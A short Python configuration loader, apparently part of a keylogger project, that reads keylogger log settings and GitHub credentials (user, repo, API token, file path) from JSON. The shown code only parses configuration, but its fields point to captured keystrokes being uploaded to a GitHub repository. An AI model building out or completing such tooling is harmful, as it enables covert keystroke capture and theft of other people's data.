import json

class Config:
    def __init__(self, path):
        self.path = path
        self.load()

    def load(self):
        with open(self.path, "r", encoding="utf-8") as f:
            data = json.load(f)

        self.gh = GithubConfig(data["gh"])
        self.keylogger = KeyloggerConfig(data["keylogger"])


class GithubConfig:
    def __init__(self, data):
        self.user = data["user"]
        self.repo = data["repo"]
        self.api_token = data["api_token"]
        self.file_path = data["file_path"]
        self.options = OptionsConfig(data["options"])


class KeyloggerConfig:
    def __init__(self, data):
        self.log_file = data["log_file"]
        self.log_size_limit = data["log_size_limit"]

class OptionsConfig:
    def __init__(self, data):
        self.time_format = data["time_format"]